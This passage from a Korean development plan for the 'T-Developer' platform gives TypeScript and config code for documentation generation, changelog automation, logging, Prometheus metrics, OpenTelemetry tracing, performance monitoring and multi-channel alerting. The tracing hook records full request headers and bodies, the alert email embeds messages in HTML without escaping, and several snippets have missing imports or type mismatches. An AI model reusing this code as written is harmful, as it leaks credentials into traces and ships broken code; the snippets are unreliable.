- [커스텀 에이전트 개발](./agents/custom.md)

### 4. [API 레퍼런스](./api/)
- [인증](./api/authentication.md)
- [프로젝트 관리](./api/projects.md)
- [에이전트 제어](./api/agents.md)
- [웹소켓 이벤트](./api/websocket.md)

### 5. [통합 가이드](./integrations/)
- [AWS 서비스](./integrations/aws.md)
- [GitHub 연동](./integrations/github.md)
- [CI/CD 파이프라인](./integrations/cicd.md)

### 6. [베스트 프랙티스](./best-practices/)
- [보안](./best-practices/security.md)
- [성능 최적화](./best-practices/performance.md)
- [에러 처리](./best-practices/error-handling.md)

### 7. [문제 해결](./troubleshooting/)
- [일반적인 문제](./troubleshooting/common-issues.md)
- [디버깅 가이드](./troubleshooting/debugging.md)
- [FAQ](./troubleshooting/faq.md)
```

```typescript
// scripts/generate-docs.ts
import { exec } from 'child_process';
import { promisify } from 'util';
import path from 'path';

const execAsync = promisify(exec);

async function generateDocumentation() {
  console.log('📚 문서 생성 시작...');
  
  try {
    // TypeDoc으로 API 문서 생성
    console.log('1️⃣ API 레퍼런스 생성 중...');
    await execAsync('npx typedoc');
    
    // Swagger 스펙 생성
    console.log('2️⃣ OpenAPI 스펙 생성 중...');
    await execAsync('npm run generate:swagger');
    
    // Markdown 문서 컴파일
    console.log('3️⃣ 마크다운 문서 처리 중...');
    await execAsync('npx @diplodoc/cli --input ./docs --output ./dist/docs');
    
    // 문서 인덱스 생성
    console.log('4️⃣ 문서 인덱스 생성 중...');
    await generateDocsIndex();
    
    console.log('✅ 문서 생성 완료!');
    console.log('📁 출력 위치: ./dist/docs');
    
  } catch (error) {
    console.error('❌ 문서 생성 실패:', error);
    process.exit(1);
  }
}

async function generateDocsIndex() {
  // 문서 인덱스 및 검색 기능을 위한 메타데이터 생성
  const docsMetadata = {
    version: process.env.npm_package_version,
    generated: new Date().toISOString(),
    sections: [
      { path: '/getting-started', title: '시작하기', weight: 1 },
      { path: '/architecture', title: '아키텍처', weight: 2 },
      { path: '/api', title: 'API 레퍼런스', weight: 3 }
    ]
  };
  
  await fs.writeFile(
    path.join('dist/docs/metadata.json'),
    JSON.stringify(docsMetadata, null, 2)
  );
}

if (require.main === module) {
  generateDocumentation();
}
```

### SubTask 0.8.5: 변경 로그 자동화
**목표**: 커밋 메시지 기반 CHANGELOG 자동 생성

**구현 내용**:
```json
// .commitlintrc.json
{
  "extends": ["@commitlint/config-conventional"],
  "rules": {
    "type-enum": [
      2,
      "always",
      [
        "feat",
        "fix",
        "docs",
        "style",
        "refactor",
        "perf",
        "test",
        "chore",
        "revert",
        "build",
        "ci"
      ]
    ],
    "subject-case": [2, "always", "sentence-case"],
    "header-max-length": [2, "always", 100]
  }
}
```

```javascript
// .changelog.config.js
module.exports = {
  "types": [
    { "type": "feat", "section": "✨ Features", "hidden": false },
    { "type": "fix", "section": "🐛 Bug Fixes", "hidden": false },
    { "type": "perf", "section": "⚡ Performance", "hidden": false },
    { "type": "docs", "section": "📚 Documentation", "hidden": false },
    { "type": "style", "section": "💎 Styles", "hidden": true },
    { "type": "refactor", "section": "♻️ Refactoring", "hidden": false },
    { "type": "test", "section": "✅ Tests", "hidden": true },
    { "type": "chore", "section": "🔧 Chores", "hidden": true },
    { "type": "build", "section": "📦 Build", "hidden": true },
    { "type": "ci", "section": "👷 CI", "hidden": true }
  ],
  "releaseCommitMessageFormat": "chore(release): 🚀 v{{currentTag}}",
  "commitUrlFormat": "{{host}}/{{owner}}/{{repository}}/commit/{{hash}}",
  "compareUrlFormat": "{{host}}/{{owner}}/{{repository}}/compare/{{previousTag}}...{{currentTag}}",
  "issueUrlFormat": "{{host}}/{{owner}}/{{repository}}/issues/{{id}}",
  "userUrlFormat": "{{host}}/{{user}}",
  "issuePrefixes": ["#", "GH-"]
};
```

```yaml
# .github/workflows/changelog.yml
name: Generate Changelog

on:
  push:
    tags:
      - 'v*'

jobs:
  changelog:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Generate Changelog
        uses: orhun/git-cliff-action@v2
        with:
          config: .cliff.toml
          args: --verbose
        env:
          OUTPUT: CHANGELOG.md
      
      - name: Commit Changelog
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add CHANGELOG.md
          git commit -m "docs: update CHANGELOG.md for ${{ github.ref_name }}"
          git push
```

**🔧 사용자 작업**:
- commitlint 설치: `npm install --save-dev @commitlint/cli @commitlint/config-conventional`
- husky 설정으로 커밋 메시지 검증
- 첫 릴리스 태그 생성 시 CHANGELOG 자동 생성 확인

---

## Task 0.9: 모니터링 및 로깅 시스템 구축

### SubTask 0.9.1: 구조화된 로깅 시스템 구현
**목표**: Winston 기반 구조화된 로깅 시스템

**구현 내용**:
```typescript
// backend/src/config/logger.ts
import winston from 'winston';
import { WinstonTransport as AxiomTransport } from '@axiomhq/winston';
import DailyRotateFile from 'winston-daily-rotate-file';

// 커스텀 로그 레벨
const customLevels = {
  levels: {
    fatal: 0,
    error: 1,
    warn: 2,
    info: 3,
    debug: 4,
    trace: 5
  },
  colors: {
    fatal: 'red bold',
    error: 'red',
    warn: 'yellow',
    info: 'green',
    debug: 'blue',
    trace: 'gray'
  }
};

// 로그 포맷
const logFormat = winston.format.combine(
  winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss.SSS' }),
  winston.format.errors({ stack: true }),
  winston.format.metadata({ fillExcept: ['message', 'level', 'timestamp', 'label'] }),
  winston.format.json()
);

// 개발 환경용 포맷
const devFormat = winston.format.combine(
  winston.format.colorize({ all: true }),
  winston.format.printf(({ timestamp, level, message, metadata }) => {
    const meta = Object.keys(metadata).length ? JSON.stringify(metadata, null, 2) : '';
    return `${timestamp} [${level}]: ${message} ${meta}`;
  })
);

class Logger {
  private logger: winston.Logger;
  
  constructor(service: string) {
    this.logger = winston.createLogger({
      levels: customLevels.levels,
      defaultMeta: { service },
      transports: this.createTransports()
    });
    
    winston.addColors(customLevels.colors);
  }
  
  private createTransports(): winston.transport[] {
    const transports: winston.transport[] = [];
    
    // 콘솔 출력
    if (process.env.NODE_ENV !== 'test') {
      transports.push(new winston.transports.Console({
        level: process.env.LOG_LEVEL || 'debug',
        format: process.env.NODE_ENV === 'production' ? logFormat : devFormat
      }));
    }
    
    // 파일 로테이션
    if (process.env.NODE_ENV === 'production') {
      // 에러 로그
      transports.push(new DailyRotateFile({
        level: 'error',
        filename: 'logs/error-%DATE%.log',
        datePattern: 'YYYY-MM-DD',
        maxSize: '20m',
        maxFiles: '14d',
        format: logFormat
      }));
      
      // 전체 로그
      transports.push(new DailyRotateFile({
        filename: 'logs/combined-%DATE%.log',
        datePattern: 'YYYY-MM-DD',
        maxSize: '20m',
        maxFiles: '7d',
        format: logFormat
      }));
    }
    
    // Axiom (클라우드 로깅)
    if (process.env.AXIOM_TOKEN) {
      transports.push(new AxiomTransport({
        dataset: process.env.AXIOM_DATASET || 't-developer',
        token: process.env.AXIOM_TOKEN
      }));
    }
    
    return transports;
  }
  
  // 로깅 메서드들
  fatal(message: string, meta?: any): void {
    this.logger.log('fatal', message, meta);
  }
  
  error(message: string, error?: Error | any, meta?: any): void {
    this.logger.error(message, { error: error?.stack || error, ...meta });
  }
  
  warn(message: string, meta?: any): void {
    this.logger.warn(message, meta);
  }
  
  info(message: string, meta?: any): void {
    this.logger.info(message, meta);
  }
  
  debug(message: string, meta?: any): void {
    this.logger.debug(message, meta);
  }
  
  trace(message: string, meta?: any): void {
    this.logger.log('trace', message, meta);
  }
  
  // 성능 측정 헬퍼
  startTimer(): () => void {
    const start = Date.now();
    return () => {
      const duration = Date.now() - start;
      return { duration };
    };
  }
  
  // 에이전트 실행 로깅
  logAgentExecution(agentName: string, projectId: string, result: 'success' | 'failure', meta?: any): void {
    this.info(`Agent execution: ${agentName}`, {
      agentName,
      projectId,
      result,
      ...meta
    });
  }
}

// 싱글톤 인스턴스
export const logger = new Logger('t-developer-backend');

// 요청별 로거 생성
export function createRequestLogger(requestId: string): Logger {
  const requestLogger = new Logger('t-developer-request');
  requestLogger['logger'].defaultMeta = { ...requestLogger['logger'].defaultMeta, requestId };
  return requestLogger;
}
```
---

### SubTask 0.9.2: 메트릭 수집 시스템 구현
**목표**: Prometheus 형식의 메트릭 수집 및 노출

**구현 내용**:
```typescript
// backend/src/config/metrics.ts
import promClient from 'prom-client';
import { Request, Response, NextFunction } from 'express';

// Prometheus 레지스트리
const register = new promClient.Registry();

// 기본 메트릭 수집
promClient.collectDefaultMetrics({ 
  register,
  prefix: 't_developer_'
});

// 커스텀 메트릭 정의
export const metrics = {
  // HTTP 요청 관련
  httpRequestDuration: new promClient.Histogram({
    name: 't_developer_http_request_duration_seconds',
    help: 'Duration of HTTP requests in seconds',
    labelNames: ['method', 'route', 'status_code'],
    buckets: [0.1, 0.3, 0.5, 0.7, 1, 3, 5, 7, 10]
  }),
  
  httpRequestTotal: new promClient.Counter({
    name: 't_developer_http_requests_total',
    help: 'Total number of HTTP requests',
    labelNames: ['method', 'route', 'status_code']
  }),
  
  // 에이전트 실행 관련
  agentExecutionDuration: new promClient.Histogram({
    name: 't_developer_agent_execution_duration_seconds',
    help: 'Duration of agent executions in seconds',
    labelNames: ['agent_name', 'status'],
    buckets: [1, 5, 10, 30, 60, 120, 300, 600]
  }),
  
  agentExecutionTotal: new promClient.Counter({
    name: 't_developer_agent_executions_total',
    help: 'Total number of agent executions',
    labelNames: ['agent_name', 'status']
  }),
  
  agentTokenUsage: new promClient.Counter({
    name: 't_developer_agent_token_usage_total',
    help: 'Total tokens used by agents',
    labelNames: ['agent_name', 'model']
  }),
  
  // 프로젝트 관련
  projectCreationDuration: new promClient.Histogram({
    name: 't_developer_project_creation_duration_seconds',
    help: 'Duration of project creation in seconds',
    labelNames: ['project_type', 'status'],
    buckets: [10, 30, 60, 120, 300, 600, 1200]
  }),
  
  activeProjects: new promClient.Gauge({
    name: 't_developer_active_projects',
    help: 'Number of currently active projects',
    labelNames: ['status']
  }),
  
  // 시스템 리소스
  cacheHitRate: new promClient.Gauge({
    name: 't_developer_cache_hit_rate',
    help: 'Cache hit rate percentage',
    labelNames: ['cache_type']
  }),
  
  queueSize: new promClient.Gauge({
    name: 't_developer_queue_size',
    help: 'Current size of job queues',
    labelNames: ['queue_name']
  }),
  
  // 비즈니스 메트릭
  componentUsage: new promClient.Counter({
    name: 't_developer_component_usage_total',
    help: 'Total usage of components',
    labelNames: ['component_name', 'version', 'language']
  }),
  
  apiKeyUsage: new promClient.Counter({
    name: 't_developer_api_key_usage_total',
    help: 'API key usage by user',
    labelNames: ['user_id', 'endpoint']
  })
};

// 모든 메트릭을 레지스트리에 등록
Object.values(metrics).forEach(metric => register.registerMetric(metric));

// Express 미들웨어
export function metricsMiddleware() {
  return (req: Request, res: Response, next: NextFunction) => {
    const start = Date.now();
    
    res.on('finish', () => {
      const duration = (Date.now() - start) / 1000;
      const route = req.route?.path || req.path;
      const labels = {
        method: req.method,
        route,
        status_code: res.statusCode.toString()
      };
      
      metrics.httpRequestDuration.observe(labels, duration);
      metrics.httpRequestTotal.inc(labels);
    });
    
    next();
  };
}

// 메트릭 엔드포인트
export function metricsEndpoint() {
  return async (req: Request, res: Response) => {
    res.set('Content-Type', register.contentType);
    const metrics = await register.metrics();
    res.end(metrics);
  };
}

// 메트릭 헬퍼 클래스
export class MetricsHelper {
  // 에이전트 실행 메트릭 기록
  static recordAgentExecution(
    agentName: string, 
    duration: number, 
    status: 'success' | 'failure',
    tokensUsed?: number,
    model?: string
  ): void {
    metrics.agentExecutionDuration.observe({ agent_name: agentName, status }, duration);
    metrics.agentExecutionTotal.inc({ agent_name: agentName, status });
    
    if (tokensUsed && model) {
      metrics.agentTokenUsage.inc({ agent_name: agentName, model }, tokensUsed);
    }
  }
  
  // 프로젝트 생성 메트릭 기록
  static recordProjectCreation(
    projectType: string,
    duration: number,
    status: 'success' | 'failure'
  ): void {
    metrics.projectCreationDuration.observe({ project_type: projectType, status }, duration);
  }
  
  // 캐시 히트율 업데이트
  static updateCacheHitRate(cacheType: string, hitRate: number): void {
    metrics.cacheHitRate.set({ cache_type: cacheType }, hitRate);
  }
  
  // 큐 크기 업데이트
  static updateQueueSize(queueName: string, size: number): void {
    metrics.queueSize.set({ queue_name: queueName }, size);
  }
  
  // 활성 프로젝트 수 업데이트
  static updateActiveProjects(counts: Record<string, number>): void {
    Object.entries(counts).forEach(([status, count]) => {
      metrics.activeProjects.set({ status }, count);
    });
  }
}
```

### SubTask 0.9.3: 분산 추적 시스템 설정
**목표**: OpenTelemetry를 이용한 분산 추적

**구현 내용**:
```typescript
// backend/src/config/tracing.ts
import { NodeTracerProvider } from '@opentelemetry/sdk-trace-node';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';
import { JaegerExporter } from '@opentelemetry/exporter-jaeger';
import { BatchSpanProcessor } from '@opentelemetry/sdk-trace-base';
import { registerInstrumentations } from '@opentelemetry/instrumentation';
import { HttpInstrumentation } from '@opentelemetry/instrumentation-http';
import { ExpressInstrumentation } from '@opentelemetry/instrumentation-express';
import { AwsInstrumentation } from '@opentelemetry/instrumentation-aws-sdk';
import { RedisInstrumentation } from '@opentelemetry/instrumentation-redis';
import { trace, context, SpanStatusCode } from '@opentelemetry/api';

// 트레이서 프로바이더 생성
const provider = new NodeTracerProvider({
  resource: new Resource({
    [SemanticResourceAttributes.SERVICE_NAME]: 't-developer',
    [SemanticResourceAttributes.SERVICE_VERSION]: process.env.npm_package_version || '1.0.0',
    [SemanticResourceAttributes.DEPLOYMENT_ENVIRONMENT]: process.env.NODE_ENV || 'development'
  })
});

// Jaeger 익스포터 설정
const jaegerExporter = new JaegerExporter({
  endpoint: process.env.JAEGER_ENDPOINT || 'http://localhost:14268/api/traces',
  serviceName: 't-developer'
});

// 배치 프로세서 추가
provider.addSpanProcessor(new BatchSpanProcessor(jaegerExporter));

// 프로바이더 등록
provider.register();

// 자동 계측 설정
registerInstrumentations({
  instrumentations: [
    new HttpInstrumentation({
      requestHook: (span, request) => {
        span.setAttributes({
          'http.request.body': JSON.stringify(request.body),
          'http.request.headers': JSON.stringify(request.headers)
        });
      }
    }),
    new ExpressInstrumentation(),
    new AwsInstrumentation({
      suppressInternalInstrumentation: true
    }),
    new RedisInstrumentation()
  ]
});

// 트레이서 인스턴스
export const tracer = trace.getTracer('t-developer', '1.0.0');

// 커스텀 스팬 생성 헬퍼
export class TracingHelper {
  // 에이전트 실행 추적
  static async traceAgentExecution<T>(
    agentName: string,
    projectId: string,
    operation: () => Promise<T>
  ): Promise<T> {
    return tracer.startActiveSpan(`agent.${agentName}.execute`, async (span) => {
      span.setAttributes({
        'agent.name': agentName,
        'project.id': projectId,
        'agent.start_time': new Date().toISOString()
      });
      
      try {
        const result = await operation();
        span.setStatus({ code: SpanStatusCode.OK });
        span.setAttributes({
          'agent.success': true,
          'agent.end_time': new Date().toISOString()
        });
        return result;
      } catch (error) {
        span.recordException(error as Error);
        span.setStatus({
          code: SpanStatusCode.ERROR,
          message: error instanceof Error ? error.message : 'Unknown error'
        });
        throw error;
      } finally {
        span.end();
      }
    });
  }
  
  // 외부 API 호출 추적
  static async traceExternalCall<T>(
    serviceName: string,
    endpoint: string,
    operation: () => Promise<T>
  ): Promise<T> {
    return tracer.startActiveSpan(`external.${serviceName}`, async (span) => {
      span.setAttributes({
        'external.service': serviceName,
        'external.endpoint': endpoint,
        'external.timestamp': new Date().toISOString()
      });
      
      try {
        const result = await operation();
        span.setStatus({ code: SpanStatusCode.OK });
        return result;
      } catch (error) {
        span.recordException(error as Error);
        span.setStatus({
          code: SpanStatusCode.ERROR,
          message: error instanceof Error ? error.message : 'Unknown error'
        });
        throw error;
      } finally {
        span.end();
      }
    });
  }
  
  // 데이터베이스 작업 추적
  static async traceDatabaseOperation<T>(
    operation: string,
    table: string,
    query: () => Promise<T>
  ): Promise<T> {
    return tracer.startActiveSpan(`db.${operation}`, async (span) => {
      span.setAttributes({
        'db.operation': operation,
        'db.table': table,
        'db.system': 'dynamodb'
      });
      
      const startTime = Date.now();
      
      try {
        const result = await query();
        const duration = Date.now() - startTime;
        
        span.setAttributes({
          'db.duration_ms': duration,
          'db.success': true
        });
        span.setStatus({ code: SpanStatusCode.OK });
        
        return result;
      } catch (error) {
        span.recordException(error as Error);
        span.setStatus({
          code: SpanStatusCode.ERROR,
          message: error instanceof Error ? error.message : 'Unknown error'
        });
        throw error;
      } finally {
        span.end();
      }
    });
  }
  
  // 배치 작업 추적
  static createBatchSpan(operationName: string, batchSize: number) {
    const span = tracer.startSpan(`batch.${operationName}`);
    span.setAttributes({
      'batch.size': batchSize,
      'batch.start_time': new Date().toISOString()
    });
    
    return {
      recordItem: (index: number, success: boolean) => {
        span.addEvent(`item_processed`, {
          'item.index': index,
          'item.success': success
        });
      },
      end: (successCount: number) => {
        span.setAttributes({
          'batch.success_count': successCount,
          'batch.failure_count': batchSize - successCount,
          'batch.end_time': new Date().toISOString()
        });
        span.end();
      }
    };
  }
}

// 컨텍스트 전파 미들웨어
export function tracingMiddleware() {
  return (req: Request, res: Response, next: NextFunction) => {
    const span = tracer.startSpan(`http ${req.method} ${req.path}`);
    
    context.with(trace.setSpan(context.active(), span), () => {
      // 요청 ID를 스팬에 추가
      span.setAttributes({
        'http.request_id': req.id,
        'http.user_agent': req.headers['user-agent'] || 'unknown'
      });
      
      // 응답 완료 시 스팬 종료
      res.on('finish', () => {
        span.setAttributes({
          'http.status_code': res.statusCode,
          'http.response_size': res.get('content-length') || 0
        });
        span.setStatus({
          code: res.statusCode >= 400 ? SpanStatusCode.ERROR : SpanStatusCode.OK
        });
        span.end();
      });
      
      next();
    });
  };
}
```

### SubTask 0.9.4: 애플리케이션 성능 모니터링 (APM)
**목표**: 실시간 성능 모니터링 및 알림 시스템

**구현 내용**:
```typescript
// backend/src/monitoring/apm.ts
import { EventEmitter } from 'events';
import os from 'os';
import v8 from 'v8';

interface PerformanceMetrics {
  cpu: {
    usage: number;
    loadAverage: number[];
  };
  memory: {
    heapUsed: number;
    heapTotal: number;
    external: number;
    rss: number;
  };
  eventLoop: {
    delay: number;
    utilization: number;
  };
  gc: {
    count: number;
    duration: number;
    type: string;
  }[];
}

export class APMService extends EventEmitter {
  private metrics: PerformanceMetrics;
  private thresholds = {
    cpu: { warning: 70, critical: 90 },
    memory: { warning: 80, critical: 95 },
    eventLoopDelay: { warning: 100, critical: 500 }
  };
  private monitoringInterval: NodeJS.Timer | null = null;
  
  constructor() {
    super();
    this.initializeMetrics();
  }
  
  private initializeMetrics(): void {
    this.metrics = {
      cpu: { usage: 0, loadAverage: [0, 0, 0] },
      memory: { heapUsed: 0, heapTotal: 0, external: 0, rss: 0 },
      eventLoop: { delay: 0, utilization: 0 },
      gc: []
    };
  }
  
  start(intervalMs: number = 5000): void {
    if (this.monitoringInterval) {
      return;
    }
    
    // GC 모니터링 활성화
    if (global.gc) {
      const performanceObserver = new PerformanceObserver((list) => {
        const entries = list.getEntries();
        entries.forEach((entry) => {
          if (entry.entryType === 'gc') {
            this.metrics.gc.push({
              count: 1,
              duration: entry.duration,
              type: entry.detail?.kind || 'unknown'
            });
          }
        });
      });
      performanceObserver.observe({ entryTypes: ['gc'] });
    }
    
    // 주기적 메트릭 수집
    this.monitoringInterval = setInterval(() => {
      this.collectMetrics();
      this.checkThresholds();
      this.emit('metrics', this.metrics);
    }, intervalMs);
    
    // Event Loop 지연 측정
    this.measureEventLoopDelay();
  }
  
  stop(): void {
    if (this.monitoringInterval) {
      clearInterval(this.monitoringInterval);
      this.monitoringInterval = null;
    }
  }
  
  private collectMetrics(): void {
    // CPU 메트릭
    const cpus = os.cpus();
    const cpuUsage = cpus.reduce((acc, cpu) => {
      const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
      const idle = cpu.times.idle;
      return acc + ((total - idle) / total) * 100;
    }, 0) / cpus.length;
    
    this.metrics.cpu = {
      usage: Math.round(cpuUsage),
      loadAverage: os.loadavg()
    };
    
    // 메모리 메트릭
    const memUsage = process.memoryUsage();
    this.metrics.memory = {
      heapUsed: memUsage.heapUsed,
      heapTotal: memUsage.heapTotal,
      external: memUsage.external,
      rss: memUsage.rss
    };
    
    // V8 힙 통계
    const heapStats = v8.getHeapStatistics();
    const heapUsedPercent = (heapStats.used_heap_size / heapStats.heap_size_limit) * 100;
    
    // 메모리 사용률 계산
    if (heapUsedPercent > this.thresholds.memory.critical) {
      this.emit('alert', {
        level: 'critical',
        type: 'memory',
        message: `Memory usage critical: ${heapUsedPercent.toFixed(2)}%`,
        value: heapUsedPercent
      });
    }
  }
  
  private measureEventLoopDelay(): void {
    let lastCheck = process.hrtime.bigint();
    
    setImmediate(() => {
      const delay = Number(process.hrtime.bigint() - lastCheck) / 1e6; // Convert to ms
      this.metrics.eventLoop.delay = delay;
      
      if (delay > this.thresholds.eventLoopDelay.critical) {
        this.emit('alert', {
          level: 'critical',
          type: 'eventLoop',
          message: `Event loop delay critical: ${delay.toFixed(2)}ms`,
          value: delay
        });
      }
      
      // 재귀적으로 계속 측정
      if (this.monitoringInterval) {
        this.measureEventLoopDelay();
      }
    });
  }
  
  private checkThresholds(): void {
    // CPU 임계값 확인
    if (this.metrics.cpu.usage > this.thresholds.cpu.critical) {
      this.emit('alert', {
        level: 'critical',
        type: 'cpu',
        message: `CPU usage critical: ${this.metrics.cpu.usage}%`,
        value: this.metrics.cpu.usage
      });
    } else if (this.metrics.cpu.usage > this.thresholds.cpu.warning) {
      this.emit('alert', {
        level: 'warning',
        type: 'cpu',
        message: `CPU usage warning: ${this.metrics.cpu.usage}%`,
        value: this.metrics.cpu.usage
      });
    }
  }
  
  getMetrics(): PerformanceMetrics {
    return { ...this.metrics };
  }
  
  getHealthStatus(): { healthy: boolean; issues: string[] } {
    const issues: string[] = [];
    
    if (this.metrics.cpu.usage > this.thresholds.cpu.warning) {
      issues.push(`High CPU usage: ${this.metrics.cpu.usage}%`);
    }
    
    const heapUsedPercent = (this.metrics.memory.heapUsed / this.metrics.memory.heapTotal) * 100;
    if (heapUsedPercent > this.thresholds.memory.warning) {
      issues.push(`High memory usage: ${heapUsedPercent.toFixed(2)}%`);
    }
    
    if (this.metrics.eventLoop.delay > this.thresholds.eventLoopDelay.warning) {
      issues.push(`High event loop delay: ${this.metrics.eventLoop.delay.toFixed(2)}ms`);
    }
    
    return {
      healthy: issues.length === 0,
      issues
    };
  }
}

// APM 서비스 인스턴스
export const apmService = new APMService();

// Express 엔드포인트
export function apmEndpoints(app: Express): void {
  // 실시간 메트릭
  app.get('/api/monitoring/metrics', (req, res) => {
    res.json(apmService.getMetrics());
  });
  
  // 헬스 체크
  app.get('/api/monitoring/health', (req, res) => {
    const health = apmService.getHealthStatus();
    res.status(health.healthy ? 200 : 503).json(health);
  });
  
  // 메트릭 스트리밍 (SSE)
  app.get('/api/monitoring/stream', (req, res) => {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    });
    
    const sendMetrics = (metrics: PerformanceMetrics) => {
      res.write(`data: ${JSON.stringify(metrics)}\n\n`);
    };
    
    apmService.on('metrics', sendMetrics);
    
    req.on('close', () => {
      apmService.removeListener('metrics', sendMetrics);
    });
  });
}
```

### SubTask 0.9.5: 알림 및 에스컬레이션 시스템
**목표**: 다양한 채널을 통한 알림 시스템 구축

**구현 내용**:
```typescript
// backend/src/monitoring/alerting.ts
import nodemailer from 'nodemailer';
import { WebClient } from '@slack/web-api';
import twilio from 'twilio';
import { logger } from '../config/logger';

interface Alert {
  id: string;
  level: 'info' | 'warning' | 'critical' | 'emergency';
  type: string;
  title: string;
  message: string;
  metadata?: Record<string, any>;
  timestamp: Date;
}

interface AlertChannel {
  send(alert: Alert): Promise<void>;
}

// 이메일 알림 채널
class EmailAlertChannel implements AlertChannel {
  private transporter: nodemailer.Transporter;
  
  constructor() {
    this.transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });
  }
  
  async send(alert: Alert): Promise<void> {
    const levelColors = {
      info: '#0066cc',
      warning: '#ff9900',
      critical: '#ff0000',
      emergency: '#660000'
    };
    
    const html = `
      <div style="font-family: Arial, sans-serif; max-width: 600px;">
        <div style="background-color: ${levelColors[alert.level]}; color: white; padding: 20px;">
          <h2 style="margin: 0;">T-Developer Alert: ${alert.title}</h2>
        </div>
        <div style="padding: 20px; background-color: #f5f5f5;">
          <p><strong>Level:</strong> ${alert.level.toUpperCase()}</p>
          <p><strong>Type:</strong> ${alert.type}</p>
          <p><strong>Time:</strong> ${alert.timestamp.toISOString()}</p>
          <p><strong>Message:</strong></p>
          <p style="background-color: white; padding: 15px; border-left: 4px solid ${levelColors[alert.level]};">
            ${alert.message}
          </p>
          ${alert.metadata ? `
            <p><strong>Additional Details:</strong></p>
            <pre style="background-color: white; padding: 15px; overflow-x: auto;">
${JSON.stringify(alert.metadata, null, 2)}
            </pre>
          ` : ''}
        </div>
      </div>
    `;
    
    await this.transporter.sendMail({
      from: process.env.ALERT_FROM_EMAIL,
      to: process.env.ALERT_TO_EMAILS?.split(','),
      subject: `[${alert.level.toUpperCase()}] T-Developer: ${alert.title}`,
      html
    });
  }
}

// Slack 알림 채널
class SlackAlertChannel implements AlertChannel {
  private client: WebClient;
  private channel: string;
  
  constructor() {
    this.client = new WebClient(process.env.SLACK_BOT_TOKEN);
    this.channel = process.env.SLACK_ALERT_CHANNEL || '#alerts';
  }
  
  async send(alert: Alert): Promise<void> {
    const levelEmojis = {
      info: ':information_source:',
      warning: ':warning:',
      critical: ':rotating_light:',
      emergency: ':fire:'
    };
    
    const levelColors = {
      info: '#0066cc',
      warning: '#ff9900',
      critical: '#ff0000',
      emergency: '#660000'
    };
    
    await this.client.chat.postMessage({
      channel: this.channel,
      attachments: [{
        color: levelColors[alert.level],
        title: `${levelEmojis[alert.level]} ${alert.title}`,
        text: alert.message,
        fields: [
          {
            title: 'Level',
            value: alert.level.toUpperCase(),
            short: true
          },
          {
            title: 'Type',
            value: alert.type,
            short: true
          }
        ],
        footer: 'T-Developer Monitoring',
        ts: Math.floor(alert.timestamp.getTime() / 1000).toString()
      }]
    });
  }
}

// SMS 알림 채널 (긴급 알림용)
class SMSAlertChannel implements AlertChannel {
  private client: twilio.Twilio;
  
  constructor() {
    this.client = twilio(
      process.env.TWILIO_ACCOUNT_SID,
      process.env.TWILIO_AUTH_TOKEN
    );
  }
  
  async send(alert: Alert): Promise<void> {
    // 긴급 알림만 SMS로 전송
    if (alert.level !== 'critical' && alert.level !== 'emergency') {
      return;
    }
    
    const recipients = process.env.SMS_ALERT_NUMBERS?.split(',') || [];
    
    for (const to of recipients) {
      await this.client.messages.create({
        body: `T-Developer ${alert.level.toUpperCase()}: ${alert.title}\n${alert.message}`,
        from: process.env.TWILIO_PHONE_NUMBER,
        to
      });
    }
  }
}

// 알림 관리자
export class AlertManager {
  private channels: Map<string, AlertChannel> = new Map();
  private alertHistory: Alert[] = [];
  private alertCooldowns: Map<string, number> = new Map();
  
  constructor() {
    this.initializeChannels();
  }
  
  private initializeChannels(): void {
    if (process.env.SMTP_HOST) {
      this.channels.set('email', new EmailAlertChannel());
    }
    
    if (process.env.SLACK_BOT_TOKEN) {
      this.channels.set('slack', new SlackAlertChannel());
    }
    
    if (process.env.TWILIO_ACCOUNT_SID) {
      this.channels.set('sms', new SMSAlertChannel());
    }
  }
  
  async sendAlert(alert: Omit<Alert, 'id' | 'timestamp'>): Promise<void> {
    const fullAlert: Alert = {
      ...alert,
      id: `alert_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      timestamp: new Date()
    };
    
    // 중복 알림 방지 (쿨다운)
    const cooldownKey = `${alert.type}:${alert.level}`;
    const lastAlert = this.alertCooldowns.get(cooldownKey);
    
    if (lastAlert && Date.now() - lastAlert < 300000) { // 5분 쿨다운
      logger.debug('Alert suppressed due to cooldown', { cooldownKey });
      return;
    }
    
    // 알림 기록
    this.alertHistory.push(fullAlert);
    this.alertCooldowns.set(cooldownKey, Date.now());
    
    // 로그 기록
    logger.warn('Alert triggered', fullAlert);
    
    // 레벨에 따른 채널 선택
    const channelsToUse = this.selectChannels(fullAlert.level);
    
    // 병렬로 알림 전송
    const sendPromises = channelsToUse.map(channelName => {
      const channel = this.channels.get(channelName);
      if (channel) {
        return channel.send(fullAlert).catch(error => {
          logger.error(`Failed to send alert via ${channelName}`, error);
        });
      }
    });
    
    await Promise.all(sendPromises);
  }
  
  private selectChannels(level: Alert['level']): string[] {
    switch (level) {
      case 'info':
        return ['slack'];
      case 'warning':
        return ['slack', 'email'];
      case 'critical':
        return ['slack', 'email', 'sms'];
      case 'emergency':
        return ['slack', 'email', 'sms'];
      default:
        return ['slack'];
    }
  }
  
  getRecentAlerts(limit: number = 50): Alert[] {
    return this.alertHistory
      .slice(-limit)
      .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }
  
  clearAlertHistory(): void {
    this.alertHistory = [];
    this.alertCooldowns.clear();
  }
}

// 알림 관리자 인스턴스
export const alertManager = new AlertManager();

// 사전 정의된 알림 템플릿
export const alertTemplates = {
  highCPU: (usage: number) => ({
    level: usage > 90 ? 'critical' as const : 'warning' as const,
    type: 'performance',
    title: 'High CPU Usage Detected',
    message: `CPU usage is at ${usage}%. This may impact system performance.`,
    metadata: { cpuUsage: usage }
  }),
  
  highMemory: (usage: number) => ({
    level: usage > 95 ? 'critical' as const : 'warning' as const,
    type: 'performance',
